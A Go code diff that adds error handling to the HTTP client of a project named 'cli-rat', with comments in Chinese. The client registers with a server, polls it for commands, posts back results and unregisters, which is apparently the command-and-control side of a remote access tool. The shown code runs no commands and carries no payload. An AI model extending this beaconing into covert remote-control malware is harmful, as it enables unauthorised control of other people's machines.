@@ -8,7 +8,6 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-
 	"cli-rat/types"
 )
 
@@ -30,7 +29,10 @@ func NewClient(serverAddr string) *Client {
 func (c *Client) Register(name string) (*types.RegisterResponse, error) {
 	// 构建注册请求
 	req := types.RegisterRequest{Name: name}
-	data, _ := json.Marshal(req)
+	data, err := json.Marshal(req)
+	if err != nil {
+		return nil, fmt.Errorf("序列化请求失败: %v", err)
+	}
 
 	// 发送POST请求到 /register 端点
 	resp, err := http.Post(c.ServerAddr+"/register", "application/json", bytes.NewBuffer(data))
@@ -55,14 +57,14 @@ func (c *Client) Poll(clientID string) (*types.PollResponse, error) {
 	// 发送GET请求到 /poll 端点，附带client_id参数
 	resp, err := http.Get(fmt.Sprintf("%s/poll?client_id=%s", c.ServerAddr, clientID))
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("轮询失败: %v", err)
 	}
 	defer resp.Body.Close()
 
 	// 解析响应
 	var result types.PollResponse
 	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
-		return nil, err
+		return nil, fmt.Errorf("解析响应失败: %v", err)
 	}
 
 	return &result, nil
@@ -79,12 +81,15 @@ func (c *Client) Submit(cmdID, status, result string) error {
 		Status:    status,
 		Result:    result,
 	}
-	data, _ := json.Marshal(req)
+	data, err := json.Marshal(req)
+	if err != nil {
+		return fmt.Errorf("序列化请求失败: %v", err)
+	}
 
 	// 发送POST请求到 /result 端点
 	resp, err := http.Post(c.ServerAddr+"/result", "application/json", bytes.NewBuffer(data))
 	if err != nil {
-		return err
+		return fmt.Errorf("提交结果失败: %v", err)
 	}
 	defer resp.Body.Close()
 
@@ -96,10 +101,18 @@ func (c *Client) Submit(cmdID, status, result string) error {
 func (c *Client) Unregister(clientID string) error {
 	// 构建注销请求
 	req := types.UnregisterRequest{ClientID: clientID}
-	data, _ := json.Marshal(req)
+	data, err := json.Marshal(req)
+	if err != nil {
+		return fmt.Errorf("序列化请求失败: %v", err)
+	}
 
 	// 发送POST请求到 /unregister 端点
-	http.Post(c.ServerAddr+"/unregister", "application/json", bytes.NewBuffer(data))
+	resp, err := http.Post(c.ServerAddr+"/unregister", "application/json", bytes.NewBuffer(data))
+	if err != nil {
+		return fmt.Errorf("注销失败: %v", err)
+	}
+	defer resp.Body.Close()
+
 	return nil
 }
 
@@ -113,18 +126,23 @@ func PostJSON(url string, body interface{}) ([]byte, error) {
 	// 序列化请求体
 	data, err := json.Marshal(body)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("序列化请求体失败: %v", err)
 	}
 
 	// 发送POST请求
 	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("POST请求失败: %v", err)
 	}
 	defer resp.Body.Close()
 
 	// 读取响应体
-	return io.ReadAll(resp.Body)
+	result, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("读取响应失败: %v", err)
+	}
+
+	return result, nil
 }
 
 // GetJSON 发送GET请求
@@ -134,10 +152,15 @@ func GetJSON(url string) ([]byte, error) {
 	// 发送GET请求
 	resp, err := http.Get(url)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("GET请求失败: %v", err)
 	}
 	defer resp.Body.Close()
 
 	// 读取响应体
-	return io.ReadAll(resp.Body)
+	result, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("读取响应失败: %v", err)
+	}
+
+	return result, nil
 }
